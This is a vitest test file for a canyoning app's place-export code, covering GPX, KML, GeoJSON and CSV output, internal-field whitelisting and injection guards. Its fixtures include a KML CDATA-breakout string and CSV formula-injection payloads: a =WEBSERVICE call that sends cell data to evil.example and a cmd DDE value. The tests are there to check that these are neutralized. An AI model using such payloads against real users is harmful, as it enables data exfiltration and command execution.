import { describe, it, expect } from "vitest";
import { buildPlaceExport } from "./placeExport";
import { parseCsv } from "./csvImport/parseCsv";
import { parseAltNames, parseFloatStrict, parseIntStrict, parseLatLng, parseSources } from "./csvImport/placeValueParsers";
import { detectPlaceColumns } from "./csvImport/placeColumns";
import type { TPlace } from "./placeUtils";

// The seven grades are FIELD VALUES now, so the fixture speaks field keys —
// and the export no longer has fixed grade columns at all: every field the
// place carries leaves through the same `attr:<key>` mechanism, which is what
// lets a campsite export `capacity` and no grades.
function place(overrides: Partial<TPlace> = {}): TPlace {
  return {
    id: "c1",
    name: "Empress Canyon",
    latitude: -33.5,
    longitude: 150.3,
    altNames: [],
    notes: null,
    fieldValues: { v_grade: 3, num_abseils: 8, longest_abseil: 30, hours: 4 },
    updatedAt: "2026-06-01T00:00:00.000Z",
    ...overrides,
  } as unknown as TPlace;
}

/** A fixture place with some field values replaced. */
function placeWith(
  values: Record<string, unknown>,
  overrides: Partial<TPlace> = {},
): TPlace {
  const base = place(overrides);
  return {
    ...base,
    fieldValues: { ...(base.fieldValues as object), ...values },
  } as TPlace;
}

async function text(blob: Blob): Promise<string> {
  return await blob.text();
}

describe("buildPlaceExport — filenames", () => {
  it("slugs a single place name", async () => {
    const { filename } = buildPlaceExport([place({ name: "Empress Canyon!" })], "gpx");
    expect(filename).toBe("logjam-empress-canyon.gpx");
  });

  it("uses a datestamped collection name for multiple places", () => {
    const { filename } = buildPlaceExport([place(), place({ id: "c2" })], "kml");
    expect(filename).toMatch(/^logjam-places-\d{8}\.kml$/);
  });
});

describe("buildPlaceExport — GPX", () => {
  it("emits a waypoint with coords, name, and description", async () => {
    const { blob } = buildPlaceExport([place()], "gpx");
    const xml = await text(blob);
    expect(xml).toContain('<wpt lat="-33.5" lon="150.3">');
    expect(xml).toContain("<name>Empress Canyon</name>");
    // No defs supplied, so the description falls back to the field KEY — the
    // same fallback a value whose definition has been deleted gets.
    expect(xml).toContain("v_grade: 3");
    expect(xml).toContain("num_abseils: 8");
    expect(blob.type).toBe("application/gpx+xml");
  });

  it("XML-escapes special characters in the name", async () => {
    const { blob } = buildPlaceExport([place({ name: 'A & B <C> "D" \'E\'' })], "gpx");
    const xml = await text(blob);
    expect(xml).toContain("A &amp; B &lt;C&gt; &quot;D&quot; &apos;E&apos;");
    expect(xml).not.toContain("<C>");
  });
});

describe("buildPlaceExport — KML", () => {
  it("emits a Placemark with CDATA description and coordinates", async () => {
    const { blob } = buildPlaceExport([place()], "kml");
    const xml = await text(blob);
    expect(xml).toContain("<Placemark>");
    expect(xml).toContain("<![CDATA[");
    expect(xml).toContain("<coordinates>150.3,-33.5,0</coordinates>");
    expect(blob.type).toBe("application/vnd.google-earth.kml+xml");
  });

  // FECO-009: a `]]>` inside notes must not terminate the CDATA section early
  // — otherwise the rest of the description is parsed as XML markup, letting
  // a shared place's owner-authored notes inject elements into the file a
  // sharee exports and opens elsewhere.
  it("escapes a ]]> inside notes instead of letting it close the CDATA section early (FECO-009)", async () => {
    const malicious = place({
      notes: 'Approach via the north gully]]></description><Placemark><name>INJECTED',
    });
    const { blob } = buildPlaceExport([malicious], "kml");
    const xml = await text(blob);

    // The raw terminator must never appear mid-content — every "]]>" in the
    // output is the CDATA-splitting escape or the section's real end.
    expect(xml).not.toMatch(/gully\]\]>/);
    expect(xml).toContain("gully]]]]><![CDATA[>");

    // Parse it for real and confirm no injected sibling element was created —
    // exactly one Placemark, and the notes text survives intact inside it.
    const doc = new DOMParser().parseFromString(xml, "application/xml");
    expect(doc.getElementsByTagName("parsererror")).toHaveLength(0);
    const placemarks = doc.getElementsByTagName("Placemark");
    expect(placemarks).toHaveLength(1);
    const description = placemarks[0].getElementsByTagName("description")[0];
    expect(description.textContent).toContain(
      "Approach via the north gully]]></description><Placemark><name>INJECTED",
    );
  });
});

// A place record carrying every internal field the API can attach — these
// must NEVER appear in an exported file (EXPORT-2).
const INTERNAL_FIELD_OVERRIDES = {
  ownerId: "user-secret-owner-id",
  importBatchId: "batch-secret-id",
  importKey: "import-key-secret",
  forkedFromId: "forked-from-secret",
  ropeWikiId: 12345,
  ropeWikiSnapshot: { huge: "blob-of-scraped-data" },
  _count: { tripLogLinks: 3, shares: 2 },
  createdAt: "2026-05-01T00:00:00.000Z",
} as Partial<TPlace>;

// EXPORT-2: an explicit whitelist, so a future column on TPlace cannot start
// leaking into files users hand to third parties. The seven grade keys left
// this list when they became field values — they ride inside `fields`, which is
// itself explicitly assigned rather than spread.
//
// `foreignFields` is deliberately NOT here and must never be: it holds another
// user's field labels and values, carried in on a copy.
const EXPECTED_PROPERTY_KEYS = [
  "name",
  "altNames",
  "notes",
  "sources",
  "fields",
];

describe("buildPlaceExport — GeoJSON", () => {
  it("emits a FeatureCollection with a Point geometry", async () => {
    const { blob } = buildPlaceExport([place()], "geojson");
    const parsed = JSON.parse(await text(blob));
    expect(parsed.type).toBe("FeatureCollection");
    expect(parsed.features[0].geometry).toEqual({ type: "Point", coordinates: [150.3, -33.5] });
  });

  it("emits exactly the whitelisted properties — no internal fields (EXPORT-2)", async () => {
    const { blob } = buildPlaceExport([place(INTERNAL_FIELD_OVERRIDES)], "geojson");
    const parsed = JSON.parse(await text(blob));
    const properties = parsed.features[0].properties as Record<string, unknown>;
    expect(Object.keys(properties).sort()).toEqual([...EXPECTED_PROPERTY_KEYS].sort());
  });

  it("emits sources as {label, url} objects and every field under fields", async () => {
    const c = placeWith({
      _sources: [
        ["RopeWiki", "https://ropewiki.com/Empress_Falls"],
        ["Guidebook p.42", ""],
      ],
      rockType: "sandstone",
      firstDescentYear: 1974,
    });
    const { blob } = buildPlaceExport([c], "geojson");
    const parsed = JSON.parse(await text(blob));
    const properties = parsed.features[0].properties as Record<string, unknown>;
    expect(properties.sources).toEqual([
      { label: "RopeWiki", url: "https://ropewiki.com/Empress_Falls" },
      { label: "Guidebook p.42", url: "" },
    ]);
    // The grades ride in `fields` alongside the user's own, which is the whole
    // point of the collapse — and `_sources` does NOT, because the internal
    // `_`-prefixed entries are not fields anyone authored.
    expect(properties.fields).toEqual({
      v_grade: 3,
      num_abseils: 8,
      longest_abseil: 30,
      hours: 4,
      rockType: "sandstone",
      firstDescentYear: 1974,
    });
    expect(properties.fields).not.toHaveProperty("_sources");
  });

  it("emits empty sources/fields for a place carrying neither", async () => {
    const bare = { ...place(), fieldValues: {} } as TPlace;
    const { blob } = buildPlaceExport([bare], "geojson");
    const parsed = JSON.parse(await text(blob));
    const properties = parsed.features[0].properties as Record<string, unknown>;
    expect(properties.sources).toEqual([]);
    expect(properties.fields).toEqual({});
  });
});

describe("buildPlaceExport — internal fields leak nowhere", () => {
  it.each(["gpx", "kml", "geojson", "csv"] as const)(
    "%s output contains no internal identifiers",
    async (format) => {
      const { blob } = buildPlaceExport([place(INTERNAL_FIELD_OVERRIDES)], format);
      const output = await text(blob);
      expect(output).not.toContain("user-secret-owner-id");
      expect(output).not.toContain("batch-secret-id");
      expect(output).not.toContain("import-key-secret");
      expect(output).not.toContain("forked-from-secret");
      expect(output).not.toContain("blob-of-scraped-data");
      expect(output).not.toContain("ropeWikiSnapshot");
      expect(output).not.toContain("_count");
    },
  );
});

describe("buildPlaceExport — CSV (EXPORT-1)", () => {
  function csvFile(content: string): File {
    return new File([content], "export.csv", { type: "text/csv" });
  }

  it("emits the import template's columns in order", async () => {
    const { blob, filename } = buildPlaceExport([place()], "csv");
    const { headers } = await parseCsv(csvFile(await text(blob)));
    // The seven grade columns are GONE from the fixed set. They are field
    // values, so they arrive as `attr:<key>` columns alongside every other
    // field the place carries — which is what lets an export of campsites
    // carry `capacity` instead of seven empty canyon columns.
    expect(headers).toEqual([
      "name",
      "latitude",
      "longitude",
      "altNames",
      "notes",
      // `sources` is always present; field (`attr:<key>`) columns appear only
      // when some place carries them.
      "sources",
      "attr:hours",
      "attr:longest_abseil",
      "attr:num_abseils",
      "attr:v_grade",
    ]);
    expect(filename).toBe("logjam-empress-canyon.csv");
    expect(blob.type).toBe("text/csv");
  });

  it("appends one attr:<key> column per custom-field key across the set, sorted, auto-mapping on re-import", async () => {
    const withFields = placeWith(
      { rockType: "granite", grade: "R2" },
      { id: "c-fields" },
    );
    const other = placeWith(
      { rockType: "basalt", waterTemp: "cold" },
      { id: "c-other" },
    );
    const { blob } = buildPlaceExport([withFields, other], "csv");
    const { headers } = await parseCsv(csvFile(await text(blob)));
    // Union of keys across the set, sorted, each prefixed — after the fixed
    // columns. The grade keys are in there too now, which is the collapse.
    expect(headers.filter((h) => h.startsWith("attr:"))).toEqual([
      "attr:grade",
      "attr:hours",
      "attr:longest_abseil",
      "attr:num_abseils",
      "attr:rockType",
      "attr:v_grade",
      "attr:waterTemp",
    ]);
    // Every attr column auto-maps straight back to its custom-field role.
    const roles = detectPlaceColumns(headers);
    expect(roles["attr:grade"]).toBe("attr:grade");
    expect(roles["attr:rockType"]).toBe("attr:rockType");
    expect(roles["attr:waterTemp"]).toBe("attr:waterTemp");
    expect(roles["sources"]).toBe("sources");
  });

  it("round-trips through the app's own CSV parser, including gnarly notes", async () => {
    const gnarly = placeWith(
      {
        v_grade: 5,
        a_grade: 2,
        commitment: 4,
        quality: 4.5,
        num_abseils: 12,
        longest_abseil: 55.5,
        hours: 7.25,
      },
      {
        id: "c-gnarly",
        name: 'Say "G\'day", mate',
        latitude: -33.123456,
        longitude: 150.654321,
        altNames: ["Gobsmacker", "Bubble Bath"],
        notes: 'Line one, with comma\nLine two has "quotes" and a ; semicolon',
      },
    );
    // A place with NO field values at all, so the absent-cell assertions below
    // are about absence rather than about the fixture's defaults.
    const plain = { ...place({ id: "c-plain" }), fieldValues: {} } as TPlace;

    const { blob } = buildPlaceExport([gnarly, plain], "csv");
    const { rows } = await parseCsv(csvFile(await text(blob)));
    expect(rows).toHaveLength(2);

    const [r1, r2] = rows;
    expect(r1.name).toBe('Say "G\'day", mate');
    expect(parseLatLng(r1.latitude)).toEqual({ ok: true, value: -33.123456 });
    expect(parseLatLng(r1.longitude)).toEqual({ ok: true, value: 150.654321 });
    expect(parseAltNames(r1.altNames)).toEqual({
      ok: true,
      value: ["Gobsmacker", "Bubble Bath"],
    });
    expect(parseIntStrict(r1["attr:v_grade"], "vGrade")).toEqual({ ok: true, value: 5 });
    expect(parseIntStrict(r1["attr:a_grade"], "aGrade")).toEqual({ ok: true, value: 2 });
    expect(parseIntStrict(r1["attr:commitment"], "commitment")).toEqual({ ok: true, value: 4 });
    expect(parseFloatStrict(r1["attr:quality"], "quality")).toEqual({ ok: true, value: 4.5 });
    expect(parseIntStrict(r1["attr:num_abseils"], "numAbseils")).toEqual({ ok: true, value: 12 });
    expect(parseFloatStrict(r1["attr:longest_abseil"], "longestAbseil")).toEqual({ ok: true, value: 55.5 });
    expect(parseFloatStrict(r1["attr:hours"], "hours")).toEqual({ ok: true, value: 7.25 });
    expect(r1.notes).toBe('Line one, with comma\nLine two has "quotes" and a ; semicolon');

    // Absent values round-trip as empty cells.
    expect(r2["attr:a_grade"]).toBe("");
    expect(r2["attr:commitment"]).toBe("");
    expect(r2["attr:quality"]).toBe("");
    expect(r2["attr:v_grade"]).toBe("");
    expect(r2.notes).toBe("");
    expect(r2.altNames).toBe("");
  });

  it("round-trips sources and custom fields through parseCsv + the role parsers, with empty cells", async () => {
    const rich = placeWith(
      {
        _sources: [
          ["RopeWiki", "https://ropewiki.com/Empress_Falls"],
          ["Guidebook, 2nd ed.", ""],
        ],
        // A string value and a numeric value.
        rockType: "sandstone",
        firstDescentYear: 1974,
      },
      { id: "c-rich" },
    );
    // No sources; only ONE of the two extra field keys present.
    const sparse = placeWith({ rockType: "granite" }, { id: "c-sparse" });

    const { blob } = buildPlaceExport([rich, sparse], "csv");
    const { headers, rows } = await parseCsv(csvFile(await text(blob)));
    expect(headers).toContain("sources");
    expect(headers).toContain("attr:firstDescentYear");
    expect(headers).toContain("attr:rockType");
    const [r1, r2] = rows;

    // Sources parse back label-for-label, URL-for-URL (JSON tuple form).
    expect(parseSources(r1.sources)).toEqual({
      ok: true,
      value: [
        ["RopeWiki", "https://ropewiki.com/Empress_Falls"],
        ["Guidebook, 2nd ed.", ""],
      ],
    });
    // No sources → empty cell → empty list.
    expect(r2.sources).toBe("");
    expect(parseSources(r2.sources)).toEqual({ ok: true, value: [] });

    // Custom-field cells re-ingest verbatim (the `attr:<key>` role stores the
    // raw string). Numeric values serialise/parse as their string form.
    expect(r1["attr:rockType"]).toBe("sandstone");
    expect(r1["attr:firstDescentYear"]).toBe("1974");
    // A place lacking a field gets an empty cell for that column.
    expect(r2["attr:rockType"]).toBe("granite");
    expect(r2["attr:firstDescentYear"]).toBe("");
  });

  // FECO-010: a cell beginning with =, +, -, @ opens as a live formula in
  // Excel/LibreOffice/Sheets. A shared place's owner-authored name/notes/
  // custom-field value is attacker-reachable text that survives export
  // unmodified without this guard.
  describe("formula-injection guard (FECO-010)", () => {
    it("prefixes a name/notes cell starting with = with a neutralizing apostrophe", async () => {
      const malicious = place({
        name: '=WEBSERVICE("https://evil.example/?d="&A1)',
        notes: "+SUM(1,2)",
      });
      const { blob } = buildPlaceExport([malicious], "csv");
      const { rows } = await parseCsv(csvFile(await text(blob)));
      expect(rows[0].name).toBe('\'=WEBSERVICE("https://evil.example/?d="&A1)');
      expect(rows[0].notes).toBe("'+SUM(1,2)");
    });

    it("prefixes a custom-field value starting with @ or - with a neutralizing apostrophe", async () => {
      const malicious = placeWith({
        danger: "@SUM(1,2)",
        warning: "-2+3+cmd|' /C calc'!A1",
      });
      const { blob } = buildPlaceExport([malicious], "csv");
      const { rows } = await parseCsv(csvFile(await text(blob)));
      expect(rows[0]["attr:danger"]).toBe("'@SUM(1,2)");
      expect(rows[0]["attr:warning"]).toBe("'-2+3+cmd|' /C calc'!A1");
    });

    it("does NOT prefix latitude/longitude — a negative coordinate is a plain number, not a formula", async () => {
      const southernWestern = place({ latitude: -33.5, longitude: -70.2 });
      const { blob } = buildPlaceExport([southernWestern], "csv");
      const raw = await text(blob);
      // The neutralizing apostrophe must never reach the coordinate cells —
      // it would corrupt the app's own round-trip via parseLatLng.
      expect(raw).not.toContain("'-33.5");
      expect(raw).not.toContain("'-70.2");
      const { rows } = await parseCsv(csvFile(raw));
      expect(parseLatLng(rows[0].latitude)).toEqual({ ok: true, value: -33.5 });
      expect(parseLatLng(rows[0].longitude)).toEqual({ ok: true, value: -70.2 });
    });

    it("leaves an ordinary name/notes cell untouched", async () => {
      const plain = place({ name: "Empress Canyon", notes: "Nice place" });
      const { blob } = buildPlaceExport([plain], "csv");
      const { rows } = await parseCsv(csvFile(await text(blob)));
      expect(rows[0].name).toBe("Empress Canyon");
      expect(rows[0].notes).toBe("Nice place");
    });
  });
});
